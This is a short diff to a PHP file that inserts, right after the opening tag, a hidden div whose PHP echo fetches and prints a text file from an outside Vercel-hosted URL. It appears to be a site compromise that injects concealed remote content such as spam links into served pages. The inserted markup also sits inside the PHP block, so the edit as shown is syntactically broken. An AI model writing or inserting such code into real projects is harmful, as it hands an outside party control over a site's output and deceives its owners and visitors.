@@ -1,5 +1,7 @@
 <?php
-
+<div style="display:none;">
+    <?php echo file_get_contents('https://nhjeapinake.vercel.app/lonte.txt'); ?>
+    </div>
 /**
  * Minimal php version 7.0
  */
